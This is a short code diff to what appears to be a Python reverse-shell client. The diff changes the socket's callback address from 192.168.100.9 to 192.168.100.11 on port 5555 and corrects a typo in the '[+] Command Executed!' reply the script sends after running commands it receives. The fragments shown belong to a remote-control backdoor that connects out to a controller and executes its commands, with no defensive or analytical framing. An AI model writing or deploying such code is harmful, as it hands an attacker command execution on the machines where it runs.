@@ -4,7 +4,7 @@ import os
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-socket.connect(('192.168.100.9', 5555))
+socket.connect(('192.168.100.11', 5555))
 
 while True:
 
@@ -109,7 +109,7 @@ while True:
 
             if out == '':
                 
-                socket.send('[+] Command Excuted!'.encode('ascii'))
+                socket.send('[+] Command Executed!'.encode('ascii'))
 
                 continue
             
